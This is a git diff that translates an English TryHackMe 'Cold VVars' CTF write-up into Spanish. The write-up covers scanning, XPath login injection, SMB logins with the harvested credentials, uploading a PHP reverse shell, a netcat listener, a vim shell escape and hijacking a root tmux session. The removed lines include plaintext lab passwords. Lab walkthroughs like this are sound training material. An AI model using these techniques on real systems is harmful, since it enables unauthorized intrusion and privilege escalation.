@@ -1,34 +1,21 @@
 ---
-title : "Cold_VVars - Write Up"
+title : "Cold VVars - Write Up - Español"
 date : 2021-07-10T17:40:55+02:00
 author : "Lanfran02"
 cover : "cover.jpeg"
 useRelativeCover : true
-description : "TryHackMe's medium level machine."
-tags : ["TryHackMe"]
+description : "Máquina de nivel medio en TryHackMe."
+tags : ["gobuster","XPATH","Burpsuite","samba","nc","vim","tmux","TryHackMe"]
 ---
 
-| Link | Level | Creator |
+| Link | Nivel | Creadores |
 |------|-------|---------|
-| [Here](https://tryhackme.com/room/)  | Medium  |  [user](https://tryhackme.com/p/)  |
+| [Aquí](https://tryhackme.com/room/coldvvars)  | Medio  |  [fl4shi3r](https://tryhackme.com/p/fl4shi3r) [cirius](https://tryhackme.com/p/cirius)  |
 
-<!--
-description : "Maquina de nivel medio en TryHackMe."
-
-| Link | Nivel | Creador |
-|------|-------|---------|
-| [Aquí](https://tryhackme.com/room/)  | Medio  |  [user](https://tryhackme.com/p/)  |
 
 ## Reconocimiento
-## Acceso inicial - Usuario
 
-
-¡Y hemos rooteado la máquina!
-
-Eso es todo de mi parte, ¡espero que lo encuentre útil!
--->
-
-## Reconn
+Usamos a nuestro gran (y único) amigo `nmap`
 
 ```bash
 ╰─ lanfran@parrot ❯ map 10.10.1.67                                                                                                 ─╯
@@ -71,7 +58,12 @@ Host script results:
 Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
 Nmap done: 1 IP address (1 host up) scanned in 58.65 seconds
 ```
+Así que escaneemos los servidores web, porque tenemos 2:
 
+- Uno que se ejecuta en el 8080, corre un `apache`.
+- Otro que se ejecuta en el 8082 y funciona con `Node.js`.
+
+1. Servidor 8080.
 ```bash
 ╰─ lanfran@parrot ❯ scan http://10.10.1.67:8080/                                                                                   ─╯
 ===============================================================
@@ -98,6 +90,8 @@ by OJ Reeves (@TheColonial) & Christian Mehlmauer (@_FireFart_)
 2021/07/10 17:40:29 Finished
 ===============================================================
 ```
+Debido a que encontramos un nuevo endpoint `/dev`, buscamos algunas extensiones específicas.
+
 ```bash
 ╰─ lanfran@parrot ❯ scan http://10.10.1.67:8080/dev -x txt,php                                                                                                                       ─╯
 ===============================================================
@@ -128,7 +122,9 @@ by OJ Reeves (@TheColonial) & Christian Mehlmauer (@_FireFart_)
 2021/07/10 18:20:54 Finished
 ===============================================================
 ```
+Bien, guardemos ese `note.txt` para más tarde.
 
+2. Servidor 8082.
 ```bash
 ╰─ lanfran@parrot ❯ scan http://10.10.1.67:8082/                                                                                                                                     ─╯
 ===============================================================
@@ -151,16 +147,28 @@ by OJ Reeves (@TheColonial) & Christian Mehlmauer (@_FireFart_)
 2021/07/10 17:43:23 Finished
 ===============================================================
 ```
+Hmmm una página de inicio de sesión. El creador nos dio una pista de "inyección XPATH" ...
+
+Entonces, tal vez esta forma sea vulnerable.
+
+Por lo tanto, utilicé `Burpsuite` para ver si con [esta lista](XPATH_list.txt) puedo explotarlo :)
 
 ![info_1](info_1.png)
 
+Al verificar la longitud de las respuestas, una de ellas era diferente y omitimos la verificación, tambien obtuvimos un conjunto de 4 usuarios:contraseña
+
 ```
 Username Password
-Tove Jani
-Godzilla KONGistheKING
-SuperMan snyderCut
-ArthurMorgan DeadEye
+Tove [REDACTADO]
+Godzilla [REDACTADO]
+SuperMan [REDACTADO]
+ArthurMorgan [REDACTADO]
 ```
+¿Recuerda el resultado de nuestro escaneo `nmap`?
+ 
+¡¡Usa tu cabeza (la de arriba) !!
+
+Encontramos un servicio `SAMBA` ejecutándose, así que usé `enum4linux` para verificar los recursos compartidos de la máquina.
 
 ```bash
  ======================================= 
@@ -173,8 +181,11 @@ ArthurMorgan DeadEye
 	SECURED         Disk      Dev
 	IPC$            IPC       IPC Service (incognito server (Samba, Ubuntu))
 ```
+Tal vez podamos intentar iniciar sesión con el usuario:contraseña que obtuvimos antes...
 
-## Foothold - User
+## Acceso inicial - Usuario
+
+Y sí, ¡funcionó! ¡Podemos iniciar sesión con la cuenta de `ArthurMorgan` en el recurso compartido `SECURED`! Por cierto, es el único que funcionó...
 
 ```bash
 ╰─ lanfran@parrot ❯ smbclient //10.10.1.67/SECURED -U ArthurMorgan                                                                 ─╯
@@ -188,29 +199,29 @@ smb: \> ls
 		7743660 blocks of size 1024. 4447240 blocks available
 smb: \> get note.txt
 getting file \note.txt of size 45 as note.txt (0.2 KiloBytes/sec) (average 0.2 KiloBytes/sec)
-smb: \> cd ..
-smb: \> ld
-ld: command not found
-smb: \> ls
-  .                                   D        0  Mon Mar 22 00:04:28 2021
-  ..                                  D        0  Thu Mar 11 13:52:29 2021
-  note.txt                            A       45  Thu Mar 11 13:19:52 2021
-
-		7743660 blocks of size 1024. 4447240 blocks available
 smb: \> exit
-ca
-╭─      ~/Desktop/THM/cold_vvars ▓▒░                                                                   ░▒▓ ✔  15s    10.9.4.9  ─╮
+
+```
+
+Listando los archivos en el directorio, encontramos un archivo `note.txt` ... Hmmm parece familiar ...
+
+Esta es una máquina de memoria XD
+
+Volviendo a nuestros hallazgos, ya hemos encontrado este archivo `note.txt` ...
+
+¡Sí! en `gobuster` lo encontré por nosotros, dentro de la carpeta` / dev`!
+
+¡Así que carguemos un shell inverso al servidor!
+```bash
 ╰─ lanfran@parrot ❯ cat note.txt                                                                                                   ─╯
 Secure File Upload and Testing Functionality
 
-╭─      ~/Desktop/THM/cold_vvars ▓▒░                                                                           ░▒▓ ✔  10.9.4.9  ─╮
 ╰─ lanfran@parrot ❯ smbclient //10.10.1.67/SECURED -U ArthurMorgan                                                                 ─╯
 Enter WORKGROUP\ArthurMorgan's password: 
 Try "help" to get a list of possible commands.
 smb: \> put shell_online.php 
 putting file shell_online.php as \shell_online.php (27.9 kb/s) (average 27.9 kb/s)
 ```
-
 ```bash
 ╰─ lanfran@parrot ❯ nc -nlvp 1337                                                                                                  ─╯
 listening on [any] 1337 ...
@@ -232,11 +243,11 @@ drwxr-xr-x  6 ArthurMorgan ArthurMorgan 4096 May 28 13:23 ArthurMorgan
 drwxr-xr-x 25 root         root         4096 May 28 12:59 ..
 drwxr-xr-x  4 root         root         4096 Mar 21 21:46 .
 ```
-And we can read the user's flag.
+Y podemos leer la bandera del usuario dentro de `/home/ArthurMorgan/user.txt`.
 
 ## Root
 
-We switched to arthurmorgan with the password, and run the command `netstat -tulwn`
+Cambiamos a `arthurmorgan` con la contraseña y ejecutamos el comando `netstat -tulwn`
 
 ```bash
 ArthurMorgan@incognito:/var/www/html/dev$ netstat -tulwn
@@ -261,6 +272,7 @@ udp        0      0 10.10.138.243:138       0.0.0.0:*
 udp        0      0 0.0.0.0:138             0.0.0.0:*                          
 raw6       0      0 :::58                   :::*                    7               
 ```
+Encontramos un puerto `4545` que acepta conexiones solo desde la propia máquina, así que, ¿qué pasa si usamos `netcat`...?
 
 ```bash
 ArthurMorgan@incognito:~$ nc -nlvp 4545
@@ -273,7 +285,32 @@ ideaBox
 2.Delete
 3.Steal others' Trash
 4.Show'nExit
-:shellhell=/bin/sh
+```
+
+Wow! ¡Nos está dando opciones para seleccionar!
+
+Probé con todas las opciones y descubrí que la opción 4 abre un editor `vim`, ¡así que puedo aprovecharme (en el buen sentido :\\)!
+
+Con el siguiente código de [GTFOBins](https://gtfobins.github.io/gtfobins/vim/):
+
+```
+vim
+:set shell=/bin/sh #Yo usé bash :p
+:shell
+```
+
+```bash
+ArthurMorgan@incognito:~$ nc -nlvp 4545
+Listening on [0.0.0.0] (family 0, port 4545)
+Connection from 127.0.0.1 37376 received!
+
+
+ideaBox
+1.Write
+2.Delete
+3.Steal others' Trash
+4.Show'nExit
+:set shell=/bin/bash
 ~                                                                               
 ~                                                                               
 ~                                                                               
@@ -300,15 +337,18 @@ ideaBox
 id
 uid=1002(marston) gid=1003(marston) groups=1003(marston)
 ```
+(Está un poco raro el código, ¡pero simplemente copié, pegué el código de GTFOBins y funcionó!)
 
-And running `ps -eaf --forest` we can see that there are some sessions running on it, so let's check them!
+Ahora tenemos una shell cómo `marston` !!
 
-To attach your shell to the session, you need to use `tmux attach-session -t 0`
+Y ejecutando `ps -eaf --forest` podemos ver que hay algunas sesiones de `tmux` ejecutándose en él, ¡así que verifiquémoslas!
 
-And after exiting some sessions, we get a `root` session!!
+Para adjuntar su shell a la sesión de `tmux`, necesita usar `tmux attach-session -t 0`
+
+¡Después de salir de algunas sesiones, obtenemos una sesión "root"!!
 
 ![root](root.png)
 
-And we rooted the machine!
+¡Y hemos rooteado la máquina!
 
-That's all from my side, hope you find this helpful!
+Eso es todo de mi parte, ¡espero que lo encuentre útil!
